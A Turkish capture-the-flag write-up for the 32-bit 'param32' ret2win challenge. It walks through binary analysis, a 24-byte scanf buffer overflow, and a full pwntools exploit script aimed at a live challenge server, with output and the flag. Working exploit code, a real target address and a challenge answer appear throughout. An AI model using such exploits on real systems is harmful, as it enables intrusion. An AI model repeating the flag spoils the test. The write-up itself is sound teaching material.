# 🎯 param32 - PWN Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Pwn-Challenge-darkblue?style=for-the-badge" alt="PWN">
  <img src="https://img.shields.io/badge/Difficulty-Easy-darkgreen?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-ret2win-purple?style=for-the-badge" alt="Type">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Pwn  
**Seviye:** Easy  
**Puan:** 500  

**Challenge Dosyası:** [📥 param32](https://drive.google.com/file/d/1RhZS6Syo0OtK97grRqm0EnAIJ6e5-jp1/view?usp=sharing)

**Bağlantı:** `nc 64.226.74.243 9993`

**Firstblood:** +50 puan

---

## 🔍 Analiz

**Hedef:** Buffer overflow ile gizli fonksiyonu çağırıp flag almak

**Strateji:** Binary analiz → Gizli fonksiyon bulma → Parametreleri tespit etme → Exploit

**İpuçları:**
- 🎯 **32-bit binary:** ret2win challenge olabilir
- 🔐 **Stripped:** Debug sembolleri yok
- 📝 **strings:** Gizli mesajlar olabilir
- 💥 **Buffer overflow:** scanf/gets gibi unsafe fonksiyonlar

---

## ✅ Çözüm Adımları

### 📥 **1. Dosya Analizi**

**Binary dosyasını indirip kontrol ediyoruz:**

```bash
file param32
```

**Çıktı:**
```
param32: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=8c0a54a015d5e14db74f817500f6ff7de8e907cc, for GNU/Linux 3.2.0, stripped
```

> ✅ **32-bit ELF** binary, **stripped** (debug sembolleri yok)

**Çalıştırılabilir yapalım:**

```bash
chmod +x param32
```

---

### 🌐 **2. Servise İlk Bağlantı**

**Önce ne yaptığını görelim:**

```bash
nc 64.226.74.243 9993
```

**Çıktı:**
```
Name:
test
Hi there, test
```

**Analiz:**
- 📝 İsim soruyor
- 🔄 Girdiğimizi geri yazdırıyor
- 💡 Buffer overflow olabilir!

---

### 🔤 **3. Strings ile Gizli Mesajları Arama**

**Binary içindeki stringlere bakalım:**

```bash
strings param32
```

**Önemli çıktılar:**
```
/lib/ld-linux.so.2
__isoc99_scanf
fclose
fopen
This function is TOP SECRET! How did you get in here?! :O    ← 🎯 Dikkat!
flag.txt                                                     ← 🎯 Dikkat!
Flag file not found!
Unauthorised access to secret function detected, authorities have been alerted!!
Name:
Hi there, %s
```

> 🚩 **EUREKA!** "TOP SECRET function" var ve **flag.txt** okumaya çalışıyor!

---

### 🔨 **4. Objdump ile Detaylı İnceleme**

**Tüm assembly kodunu görelim:**

```bash
objdump -d param32 > param32_disasm.txt
less param32_disasm.txt
```

**Gizli fonksiyonu bulduk - `0x080491d6` adresinde:**

```assembly
080491d6 <.text>:
 80491d6:       55                      push   %ebp
 80491d7:       89 e5                   mov    %esp,%ebp
 80491d9:       53                      push   %ebx
 80491da:       81 ec 14 01 00 00       sub    $0x114,%esp
 ...
 80491eb:       81 7d 08 ef be ad de    cmpl   $0xdeadbeef,0x8(%ebp)    ← Param1 kontrolü!
 80491f2:       0f 85 9d 00 00 00       jne    8049295
 80491f8:       81 7d 0c be ba de c0    cmpl   $0xc0debabe,0xc(%ebp)    ← Param2 kontrolü!
 80491ff:       0f 85 90 00 00 00       jne    8049295
 ...
 8049208:       8d 83 08 e0 ff ff       lea    -0x1ff8(%ebx),%eax
 804920e:       50                      push   %eax
 804920f:       e8 6c fe ff ff          call   8049080 <puts@plt>        ← "TOP SECRET" mesajı
 ...
 8049228:       e8 73 fe ff ff          call   80490a0 <fopen@plt>       ← flag.txt açıyor!
```

**Analiz:**
- 🎯 Gizli fonksiyon: **0x080491d6**
- 🔑 Param1 kontrolü: **0xdeadbeef**
- 🔑 Param2 kontrolü: **0xc0debabe**
- 📁 Eğer parametreler doğruysa → **flag.txt** açıyor!

---

### 📐 **5. Main Fonksiyonunu Analiz Etme**

**Main fonksiyon `0x080492ad` adresinde:**

```assembly
080492ad <.text>:
 80492ad:       55                      push   %ebp
 80492ae:       89 e5                   mov    %esp,%ebp
 80492b0:       53                      push   %ebx
 80492b1:       83 ec 14                sub    $0x14,%esp
 ...
 80492c9:       e8 b2 fd ff ff          call   8049080 <puts@plt>        ← "Name:" yazdırıyor
 ...
 80492d4:       8d 45 e8                lea    -0x18(%ebp),%eax          ← Buffer: ebp-0x18 = 24 byte!
 80492d7:       50                      push   %eax
 80492d8:       8d 83 62 e0 ff ff       lea    -0x1f9e(%ebx),%eax
 80492de:       50                      push   %eax
 80492df:       e8 cc fd ff ff          call   80490b0 <__isoc99_scanf@plt> ← scanf("%s", buffer)
```

**Kritik bilgiler:**
- 📏 Buffer boyutu: **24 byte** (`ebp-0x18`)
- 💉 Input fonksiyonu: **scanf()** - buffer overflow!
- 🎯 Format: `%s` - sınırsız input alabiliriz!

---

### 🎯 **6. GDB ile Doğrulama**

**GDB ile açıp fonksiyonları kontrol edelim:**

```bash
gdb param32
```

**GDB içinde:**

```gdb
(gdb) info functions
```

**Çıktı:**
```
All defined functions:

Non-debugging symbols:
0x08049040  __libc_start_main@plt
0x08049050  printf@plt
0x08049060  fgets@plt
0x08049070  fclose@plt
0x08049080  puts@plt
0x08049090  setvbuf@plt
0x080490a0  fopen@plt
0x080490b0  __isoc99_scanf@plt
```

> 💡 Stripped olduğu için fonksiyon isimleri yok ama objdump ile bulduklarımız doğru!

---

### 💡 **7. Exploit Stratejisi**

**Stack layout'u anlayalım:**

```
32-bit fonksiyon çağrısı:
[return_address][param1][param2]
```

**Bizim payload:**
```
[24 byte buffer] + [4 byte EBP] + [gizli_fonksiyon] + [dummy_ret] + [0xdeadbeef] + [0xc0debabe]
```

**Neden dummy_ret?**
- Fonksiyon çağrıldığında return address olarak stack'te bir yer olmalı
- Fonksiyon bitince nereye dönecek? (bizi ilgilendirmiyor ama stack düzeni için gerekli)

**Adresler:**
```
Gizli fonksiyon: 0x080491d6
Param1:          0xdeadbeef
Param2:          0xc0debabe
Dummy return:    0x41414141 (AAAA)
```

---

### 🚀 **8. Python ile Exploit Yazma**

**pwntools kullanarak exploit oluşturuyoruz:**

```python
from pwn import *

remote_host = '64.226.74.243'
remote_port = 9993

context.arch = 'i386'
context.log_level = 'info'

# Adresler
SECRET_FUNCTION = 0x080491d6
PARAM1 = 0xdeadbeef
PARAM2 = 0xc0debabe

print("="*60)
print("[*] param32 PWN Challenge - Exploit")
print("="*60)
print(f"\n[*] Hedef: {remote_host}:{remote_port}")
print(f"[*] Gizli fonksiyon: {hex(SECRET_FUNCTION)}")
print(f"[*] Param1: {hex(PARAM1)}")
print(f"[*] Param2: {hex(PARAM2)}")

# Remote bağlantı
p = remote(remote_host, remote_port)

# Payload oluştur
payload = b'A' * 24              # Buffer (24 byte)
payload += b'B' * 4              # EBP (4 byte)
payload += p32(SECRET_FUNCTION)  # Return address
payload += p32(0x41414141)       # Dummy return
payload += p32(PARAM1)           # Param1: 0xdeadbeef
payload += p32(PARAM2)           # Param2: 0xc0debabe

print(f"\n[*] Payload boyutu: {len(payload)} bytes")
print("[*] Payload gönderiliyor...")

# Payload gönder
p.sendlineafter(b'Name:\n', payload)

# Sonucu al
print("\n[+] FLAG alınıyor...\n")
data = p.recvall(timeout=3)
print(data.decode('utf-8', errors='ignore'))

p.close()
```

---

### 🎉 **9. Exploit Çalıştırma**

**Scripti çalıştırıyoruz:**

```bash
python3 exploit.py
```

**Çıktı:**
```
==============================================================
[*] param32 PWN Challenge - Exploit
==============================================================

[*] Hedef: 64.226.74.243:9993
[*] Gizli fonksiyon: 0x80491d6
[*] Param1: 0xdeadbeef
[*] Param2: 0xc0debabe

[x] Opening connection to 64.226.74.243 on port 9993
[+] Opening connection to 64.226.74.243 on port 9993: Done
[*] Payload boyutu: 44 bytes
[*] Payload gönderiliyor...

[+] FLAG alınıyor...

Hi there, AAAAAAAAAAAAAAAAAAAAAAAABBBBÖAAÿ¾­Þ¾ºÞÀ
This function is TOP SECRET! How did you get in here?! :O
Flag{32bitparametreliRet2WinGerceklesti64bitteGoruselim}

[*] Closed connection to 64.226.74.243 port 9993
```

> ✅ **BAŞARILI!** Gizli fonksiyonu çağırdık ve flag'i aldık!

---

## 🚩 **FLAG**

```
Flag{32bitparametreliRet2WinGerceklesti64bitteGoruselim}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🔍<br><b>file</b><br><sub>Binary analizi</sub></td>
<td align="center">🔤<br><b>strings</b><br><sub>String extraction</sub></td>
<td align="center">🔨<br><b>objdump</b><br><sub>Disassembly</sub></td>
<td align="center">🐛<br><b>GDB</b><br><sub>Debugging</sub></td>
</tr>
<tr>
<td align="center">🐍<br><b>pwntools</b><br><sub>Exploit development</sub></td>
<td align="center">🌐<br><b>netcat</b><br><sub>Network testing</sub></td>
<td align="center">💻<br><b>Python3</b><br><sub>Scripting</sub></td>
<td align="center">🐧<br><b>Kali Linux</b><br><sub>Analiz ortamı</sub></td>
</tr>
</table>

**Kullanılan Komutlar:**

```bash
# Binary analizi
file param32
chmod +x param32

# İlk test
nc 64.226.74.243 9993

# String analizi
strings param32 | grep -i secret

# Disassembly
objdump -d param32 > param32_disasm.txt

# GDB debugging
gdb param32
(gdb) info functions
(gdb) disassemble main

# Exploit
python3 exploit.py
```

---

## 💭 **Çözüm Akışı**

```
🎯 param32 Challenge
         ↓
📥 Binary İndir → file param32 → 32-bit ELF
         ↓
🌐 İlk Test → nc 64.226.74.243 9993 → İsim soruyor
         ↓
🔤 strings param32 → "TOP SECRET function" bulundu!
   → flag.txt okuyor!
         ↓
🔨 objdump -d param32 → Gizli fonksiyon: 0x080491d6
         ↓
🔑 Parametre Kontrolü:
   cmpl $0xdeadbeef,0x8(%ebp)  → Param1
   cmpl $0xc0debabe,0xc(%ebp)  → Param2
         ↓
📐 Main Analizi:
   lea -0x18(%ebp),%eax → Buffer: 24 byte
   call scanf           → Buffer overflow!
         ↓
💡 Exploit Stratejisi:
   [24 byte] + [4 EBP] + [0x080491d6] + [dummy] + [0xdeadbeef] + [0xc0debabe]
         ↓
🐍 Python + pwntools → Exploit yazıldı
         ↓
🚀 Exploit Gönder → Remote'a bağlan
         ↓
🚩 Flag{32bitparametreliRet2WinGerceklesti64bitteGoruselim}
```
